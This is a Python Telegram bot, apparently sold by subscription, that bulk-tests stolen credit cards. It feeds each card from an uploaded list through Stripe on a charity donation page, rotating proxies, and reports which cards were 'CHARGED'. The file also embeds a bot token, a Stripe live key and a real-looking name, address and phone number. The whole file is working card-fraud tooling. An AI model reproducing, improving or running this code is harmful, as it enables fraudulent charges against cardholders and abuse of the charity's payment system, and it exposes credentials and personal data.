import requests
import re
import random
import string
import time
import os
import json
from telebot import types
import telebot
from urllib.parse import urlparse

def get_proxy_ip(proxy):
    test_url = "http://ip-api.com/json"
    proxy_dict = {"http": proxy, "https": proxy}
    try:
        response = requests.get(test_url, proxies=proxy_dict, timeout=5)
        if response.status_code == 200:
            ip_info = response.json()
            return ip_info.get('query')
        else:
            return None
    except requests.exceptions.RequestException:
        return None

def Tele(ccx, amount, proxy):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return "Error: Invalid CC format", None

    if "20" in yy:
        yy = yy.split("20")[1]

    def generate_user_agent():
        return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"

    def generate_username():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=20))
        return f"{name}{number}"

    def generate_random_code(length=32):
        letters_and_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_and_digits) for _ in range(length))

    user = generate_user_agent()
    acc = generate_random_account()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    r = requests.session()
    r.proxies.update({"http": proxy, "https": proxy})

    headers = {
        'authority': 'needhelped.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'referer': 'https://needhelped.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    try:
        r0 = r.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', cookies=r.cookies, headers=headers)
        nonce = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', r0.text).group(1)
    except Exception as e:
        return f"Error fetching nonce: {e}", None

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }

    data = (
        f'type=card&billing_details[name]=Test+User&billing_details[email]={acc}&card[number]={n}&card[cvc]={cvc}'
        f'&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
    )

    try:
        r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        response_json = r1.json()
        id = response_json.get('id')
        if not id:
            return f"Error: No 'id' in response. Response: {response_json}", None
    except Exception as e:
        return f"Error creating payment method: {e}", None

    headers = {
        'authority': 'needhelped.com',
        'accept': 'application/json, text/javascript, /; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://needhelped.com',
        'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'charitable_form_id': '67ab768b8d4b1',
        '67ab768b8d4b1': '',
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
        'campaign_id': '1164',
        'description': 'Poor Children Donation Support',
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': f'{amount:.2f}',
        'first_name': 'Baign',
        'last_name': 'Raja',
        'email': 'Jjuuu818@gmail.com',
        'address': '32300 116th St',
        'address_2': '',
        'city': 'Wilmot',
        'state': 'Wisconsin',
        'postcode': '53192',
        'country': 'US',
        'phone': '8473614926',
        'gateway': 'stripe',
        'stripe_payment_method': id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }

    try:
        r2 = r.post('https://needhelped.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        return r2.json(), get_proxy_ip(proxy)
    except Exception as e:
        return f"Error making donation: {e}", None

token = '7691499802:AAGRNL6Ws7SjOq_AO3VpRaziL_TQ0epG0_M'
bot = telebot.TeleBot(token, parse_mode="HTML")
allowed_users = ['47987980465', '7579489523', '7749807563', '6099962760']
admin_user_ids = ['7579489523', '7016938162']

def load_proxies():
    with open("proxy.txt", "r") as file:
        return [line.strip() for line in file.readlines()]

proxies = load_proxies()

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in allowed_users:
        bot.reply_to(message, "🚫 You cannot use the bot. Contact developers to purchase a bot subscription.")
        return
    bot.reply_to(message, "Available Gateways:\n/ch - Stripe Charge\n/stop - Stop the current process\n\nSend /ch followed by the amount to start checking.")

@bot.message_handler(commands=["add"])
def add_user(message):
    if str(message.chat.id) in admin_user_ids:
        try:
            new_user_id = message.text.split()[1]
            allowed_users.append(new_user_id)
            bot.reply_to(message, f"User ID {new_user_id} Has Been Added Successfully.✅\nCongratulations! Premium New User🎉✅ ")
            save_user_ids()
        except IndexError:
            bot.reply_to(message, "Please provide a valid user ID. Example: /add 123456789")
    else:
        bot.reply_to(message, "You do not have permission to add users.🚫")

@bot.message_handler(commands=["ch"])
def stripe_charge(message):
    if str(message.chat.id) not in allowed_users:
        bot.reply_to(message, "🚫 You cannot use the bot. Contact developers to purchase a bot subscription.")
        return
    bot.reply_to(message, "Send the amount to charge followed by the txt file.")
    bot.register_next_step_handler(message, process_amount)

@bot.message_handler(commands=["stop"])
def stop_process(message):
    if str(message.chat.id) not in allowed_users:
        bot.reply_to(message, "🚫 You cannot use the bot. Contact developers to purchase a bot subscription.")
        return
    with open("stop.stop", "w") as file:
        pass
    bot.reply_to(message, "Successfully stopped 🛑")

def process_amount(message):
    if message.text is None:
        bot.reply_to(message, "Please send a valid amount.")
        return

    try:
        amount = float(message.text.strip())
        bot.reply_to(message, f"Charging ${amount} per card. Send the txt file now.")
        bot.register_next_step_handler(message, process_stripe_charge, amount)
    except ValueError:
        bot.reply_to(message, "Wrong amount. Please send a valid numerical amount.")

def process_stripe_charge(message, amount):
    if not message.document:
        bot.reply_to(message, "Please send a valid txt file.")
        return

    ko = bot.reply_to(message, "Processing Card Checking ...⌛").message_id
    file_info = bot.get_file(message.document.file_id)
    file_content = bot.download_file(file_info.file_path)

    with open("combo.txt", "wb") as w:
        w.write(file_content)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            checked_count = 0

            for cc in lino:
                if os.path.exists("stop.stop"):
                    bot.reply_to(message, "Successfully stopped 🛑")
                    os.remove("stop.stop")
                    return

                data = {}
                try:
                    response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
                    if response.status_code == 200:
                        data = response.json()
                    else:
                        data = {"brand": "Unknown", "type": "Unknown", "country_name": "Unknown", "country_flag": "🏳", "bank": "Unknown"}
                except Exception as e:
                    print(f"API Error: {e}")

                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '🏳')
                bank = data.get('bank', 'Unknown')

                # Select a random proxy for each card check
                proxy = random.choice(proxies)
                start_time = time.time()
                try:
                    last, proxy_ip = Tele(cc, amount, proxy)
                    if isinstance(last, str):
                        last = json.loads(last)
                except Exception as e:
                    print(e)
                    last, proxy_ip = {"success": False, "errors": ["Error processing card"]}, None

                end_time = time.time()
                execution_time = end_time - start_time
                checked_count += 1

                status_message = f'''
• CC: {cc}
• STATUS : {last.get('errors', ['Unknown'])[0]}
• TOTAL 🎉 : [ {total} ]
• CHECKED : [ {checked_count} ]
• PROXY IP : [ {proxy_ip if proxy_ip else 'Unknown'} ]'''

                mes = types.InlineKeyboardMarkup(row_width=1)
                mes.add(
                    types.InlineKeyboardButton(f"[ STOP 🚫 ]", callback_data='stop')
                )

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=ko,
                    text=status_message,
                    reply_markup=mes
                )

                if last.get('success'):
                    bot.reply_to(message, f'''
🔥 CHARGED ${amount}!
CC: <code>{cc}</code>
Response: Thank You For Donation 🎉
Info: {cc[:6]} - {card_type} - {brand}
Country: {country} {country_flag}
Bank: {bank}
Time: {"{:.1f}".format(execution_time)}s
Bot By: <a href='t.me/BaignX'>BaignX</a>
{checked_count} / {total}''')

    except Exception as e:
        print(e)

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='BEEN COMPLETED ✅\nBOT BY ➜ @BaignX')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    with open("stop.stop", "w") as file:
        pass

def save_user_ids():
    with open("allowed_users.txt", "w") as file:
        for user_id in allowed_users:
            file.write(f"{user_id}\n")

def load_user_ids():
    global allowed_users
    if os.path.exists("allowed_users.txt"):
        with open("allowed_users.txt", "r") as file:
            allowed_users = [line.strip() for line in file.readlines()]

load_user_ids()
bot.polling()
  
